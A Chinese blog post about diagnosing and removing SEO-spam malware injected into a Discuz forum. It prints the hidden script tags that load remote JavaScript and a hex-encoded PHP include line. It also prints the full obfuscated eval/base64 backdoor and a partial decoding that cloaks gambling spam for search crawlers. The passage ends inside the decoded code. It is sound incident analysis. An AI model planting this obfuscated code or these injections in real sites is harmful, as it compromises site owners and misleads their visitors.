<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8"/>
    <title>论坛被挂暗链问题分析与解决 | 看看俺 - KanKanAn.com</title>
    <link rel="shortcut icon" href="/static/favicon.ico" />
    <link rel="stylesheet" type="text/less" href="../../../style/less/o-blog.less"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="generator" content="o-blog"/>
    <script src="../../../style/js/less-1.3.0.min.js" type="text/javascript"></script>
    <script src="../../../style/js/jquery-1.7.1.min.js" type="text/javascript"></script>
    <script src="../../../style/bootstrap/js/bootstrap-modal.js" type="text/javascript"></script>
    <script src="../../../style/bootstrap/js/bootstrap-transition.js" type="text/javascript"></script>
    <script src="../../../style/bootstrap/js/bootstrap-dropdown.js" type="text/javascript"></script>
    <script src="../../../style/bootstrap/js/bootstrap-collapse.js" type="text/javascript"></script>
    <script src="../../../style/js/prettify.js" type="text/javascript"></script>
    <script src="../../../style/js/o-blog.linenumber.js" type="text/javascript"></script>
    <script src="../../../style/js/o-blog-fix.js" type="text/javascript"></script>
    
    
  </head>
  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
	<div class="container">
	  <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
	  <a class="brand" href="../../../index.html" style="line-height:100%;">看看俺 - KanKanAn.com</a>
	  <div class="nav-collapse collapse">
	    <ul class="org-ul">
<li><a href="../../../archives.html"><i>icon-list icon-white</i> 归档</a>
</li>

<li><a href="../../../tags.html"><i>icon-tags icon-white</i> 标签</a>
</li>

<li><a href="../../../index.xml"><i>icon-rss icon-white</i> 订阅</a>
</li>
</ul>

	  </div>
	</div>
      </div>
    </div>
    <div class="container container-fluid" style="padding-top: 60px;">
      <div class="row-fluid">
        <div id="page" class="span9">

  <div class="article">
  <header class="article-header">

    <div class="page-header">
      <div class="row">
	<div class="date span1">
	  <div class=" date-d">01</div>
	  <div class=" date-m"><a href="../../../posts/2014/04/index.html">4月</a></div>
	  <div class=" date-y"><a href="../../../posts/2014/index.html">2014</a>
	  </div>
	</div>
	<div class="span1">
	  <div class="qr-code">
  <img style="min-width:90px; min-height:90px; max-width:90px; max-height:90px;" src="http://chart.apis.google.com/chart?chs=90x90&cht=qr&chld=|0&chl=http%3A%2F%2Fblog.kankanan.com%2Fposts%2F2014%2F04%2F01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html"
       alt="qr-code" />
</div>

	</div>
	<h1 class="offset2">论坛被挂暗链问题分析与解决</h1>
      </div>
      <nav>
	<ul class="pager">
	  <li class="previous"><a href="../../../posts/2014/03/12_archlinux7f517edc63a553e34e0a51fa73b04e244e2aip.html"><i class="icon-chevron-left"></i>&nbsp;Archlinux网络接口上出现两个IP</a></li><li class="next" style="text-align: right;"><a href="../../../posts/2014/09/19_linux4e0b4fee6539952e4f4d66205c04.html">linux下修改键位映射&nbsp;<i class="icon-chevron-right"></i></a></li>
	</ul>
      </nav>
    </div>

  </header>
  <div class="article-content">
    

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">发现问题</h2>
<div class="outline-text-2" id="text-1">
<p>
有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
</p>


<div class="figure">
<p><img src="../../../posts/2014/04/01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3/site_attacked.png" alt="site_attacked.png" />
</p>
</div>

<p>
直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">解决问题</h2>
<div class="outline-text-2" id="text-2">
<p>
直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
</p>

<ul class="org-ul">
<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获
</li>

<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧
</li>

<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js加载： <code>http://api.discuz.com.de/Seo.js</code> 

<p>
在代码和数据库中搜索这个js找不到任何信息。
</p>

<ul class="org-ul">
<li>将恶意站点配置一条 <code>hosts</code> 

<pre class="example">
127.0.0.1 api.discuz.com.de
</pre>
</li>
</ul>
<p>
浏览器不再自动跳转到恶意网站了。 
</p>
</li>

<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

<div class="org-src-container">

<pre class="src src-html">&lt;<span style="color: #edd400; font-weight: bold; font-style: italic;">div</span> <span style="color: #eeeeec;">style</span>='display:none'&gt;&lt;<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span> <span style="color: #eeeeec;">language</span>='javascript' <span style="color: #eeeeec;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #eeeeec;">&amp;logo</span>=1' <span style="color: #eeeeec;">charset</span>='gb2312'&gt;&lt;/<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span>&gt;&lt;/<span style="color: #edd400; font-weight: bold; font-style: italic;">div</span>&gt;&lt;<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span> <span style="color: #eeeeec;">type</span>='text/javascript' <span style="color: #eeeeec;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span>&gt;
</pre>
</div>
</li>

<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起

<div class="org-src-container">

<pre class="src src-php"><span style="color: #729fcf; font-weight: bold;">INCLUDE</span>(<span style="color: #eeeeec; background-color: #2e3436;">pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,<span style="color: #ad7fa8; font-style: italic;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span>));
</pre>
</div>

<p>
上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
</p>

<p>
删除该语句后问题解决。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">分析恶意代码</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span> $<span style="color: #eeeeec;">O00OO0</span>=<span style="color: #eeeeec; background-color: #2e3436;">urldecode(</span><span style="color: #ad7fa8; font-style: italic;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span>);$<span style="color: #eeeeec;">O00O0O</span>=$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">3</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">6</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">33</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">30</span>};$<span style="color: #eeeeec;">O0OO00</span>=$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">33</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">10</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">24</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">10</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">24</span>};$<span style="color: #eeeeec;">OO0O00</span>=$<span style="color: #eeeeec;">O0OO00</span>{<span style="color: #eeeeec; background-color: #2e3436;">0</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">18</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">3</span>}.$<span style="color: #eeeeec;">O0OO00</span>{<span style="color: #eeeeec; background-color: #2e3436;">0</span>}.$<span style="color: #eeeeec;">O0OO00</span>{<span style="color: #eeeeec; background-color: #2e3436;">1</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">24</span>};$<span style="color: #eeeeec;">OO0000</span>=$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">7</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">13</span>};$<span style="color: #eeeeec;">O00O0O</span>.=$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">22</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">36</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">29</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">26</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">30</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">32</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">35</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">26</span>}.$<span style="color: #eeeeec;">O00OO0</span>{<span style="color: #eeeeec; background-color: #2e3436;">30</span>};<span style="color: #eeeeec; background-color: #2e3436;">eval(</span>$<span style="color: #eeeeec;">O00O0O</span>(<span style="color: #ad7fa8; font-style: italic;">"JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="</span>));<span style="color: #729fcf;">?&gt;</span>
</pre>
</div>
</li>

<li>参考 <a href="http://blog.i1728.com/post/99.html">网上方法</a> 解码的结果

<div class="org-src-container">

<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span>
<span style="color: #888a85;">/*</span>
<span style="color: #888a85;">*author:whoami</span>
<span style="color: #888a85;">*  QQ  :4892057</span>
<span style="color: #888a85;">*/</span>
<span style="color: #eeeeec; background-color: #2e3436;">error_reporting(0</span>);
$<span style="color: #eeeeec;">fileDir</span> = <span style="color: #ad7fa8; font-style: italic;">'/var/tmp/.SYSDUMP/'</span>;
$<span style="color: #eeeeec;">IP</span>=$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'REMOTE_ADDR'</span>];
$<span style="color: #eeeeec;">Bot</span>=$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_USER_AGENT'</span>];
$<span style="color: #eeeeec;">Ref</span>=$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_REFERER'</span>];
$<span style="color: #eeeeec;">KIP</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'117.28.255.37'</span>,<span style="color: #ad7fa8; font-style: italic;">'116.55.241.24'</span>,<span style="color: #ad7fa8; font-style: italic;">'125.64.94.219'</span>,<span style="color: #ad7fa8; font-style: italic;">'119.147.114.213'</span>,<span style="color: #ad7fa8; font-style: italic;">'118.122.188.194'</span>,<span style="color: #ad7fa8; font-style: italic;">'60.172.229.61'</span>,<span style="color: #ad7fa8; font-style: italic;">'61.188.39.16'</span>,<span style="color: #ad7fa8; font-style: italic;">'61.147.98.198'</span>,<span style="color: #ad7fa8; font-style: italic;">'61.129.45.72'</span>,<span style="color: #ad7fa8; font-style: italic;">'113.98.254.245'</span>,<span style="color: #ad7fa8; font-style: italic;">'58.221.61.128'</span>,<span style="color: #ad7fa8; font-style: italic;">'117.34.73.70'</span>,<span style="color: #ad7fa8; font-style: italic;">'58.215.190.84'</span>,<span style="color: #ad7fa8; font-style: italic;">'117.28.255.53'</span>,<span style="color: #ad7fa8; font-style: italic;">'183.91.40.144'</span>,<span style="color: #ad7fa8; font-style: italic;">'117.21.220.245'</span>,<span style="color: #ad7fa8; font-style: italic;">'122.228.200.46'</span>,<span style="color: #ad7fa8; font-style: italic;">'61.164.150.70'</span>,<span style="color: #ad7fa8; font-style: italic;">'61.147.108.41'</span>,<span style="color: #ad7fa8; font-style: italic;">'116.55.242.138'</span>,<span style="color: #ad7fa8; font-style: italic;">'114.80.222.242'</span>,<span style="color: #ad7fa8; font-style: italic;">'61.147.108.41'</span>,<span style="color: #ad7fa8; font-style: italic;">'116.255.230.70'</span>,<span style="color: #ad7fa8; font-style: italic;">'222.186.24.26'</span>,<span style="color: #ad7fa8; font-style: italic;">'222.186.24.59'</span>,<span style="color: #ad7fa8; font-style: italic;">'220.181.158.106'</span>,<span style="color: #ad7fa8; font-style: italic;">'123.125.160.215'</span>);
$<span style="color: #eeeeec;">KBot</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Baiduspider'</span>,<span style="color: #ad7fa8; font-style: italic;">'Googlebot'</span>,<span style="color: #ad7fa8; font-style: italic;">'Yahoo'</span>,<span style="color: #ad7fa8; font-style: italic;">'Bingbot'</span>,<span style="color: #ad7fa8; font-style: italic;">'Sosospider'</span>,<span style="color: #ad7fa8; font-style: italic;">'Sogou'</span>,<span style="color: #ad7fa8; font-style: italic;">'360Spider'</span>,<span style="color: #ad7fa8; font-style: italic;">'YoudaoBot'</span>);
$<span style="color: #eeeeec;">Key</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'anquan.org'</span>,<span style="color: #ad7fa8; font-style: italic;">'google.com'</span>,<span style="color: #ad7fa8; font-style: italic;">'soso.com'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e8%b5%8c'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e9%aa%b0'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e9%b1%bc'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e7%89%9b'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%8d%9a%e5%bd%a9'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e7%99%be%e5%ae%b6'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e6%a3%8b%e7%89%8c'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e6%b8%b8%e6%88%8f'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%a8%b1%e4%b9%90'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%9b%bd%e9%99%85'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e7%9c%9f%e4%ba%ba'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e7%9c%9f%e9%92%b1'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e7%8e%b0%e9%87%91'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e6%b3%a8%e5%86%8c'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%bc%80%e6%88%b7'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%bd%a9%e9%87%91'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e8%b5%9a%e9%92%b1'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e6%8f%90%e7%8e%b0'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e7%ad%96%e7%95%a5'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e8%af%95%e7%8e%a9'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%b9%b3%e5%8f%b0'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span>);
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">dec0de</span>($<span style="color: #eeeeec;">fileDir</span>,$<span style="color: #eeeeec;">data</span>){
$<span style="color: #eeeeec;">dataArr</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,$<span style="color: #eeeeec;">data</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">Keys</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(str_rot13(pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,$<span style="color: #eeeeec;">dataArr</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>]))));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">News</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(str_rot13(pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,$<span style="color: #eeeeec;">dataArr</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>]))));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">Links</span>= <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(str_rot13(pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,$<span style="color: #eeeeec;">dataArr</span>[<span style="color: #eeeeec; background-color: #2e3436;">2</span>]))));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #729fcf; font-weight: bold;">include</span>($<span style="color: #eeeeec;">fileDir</span>.<span style="color: #ad7fa8; font-style: italic;">'.Wh0AmI.MODEL'</span>);<span style="color: #f57900; font-weight: bold;">die</span>;
}
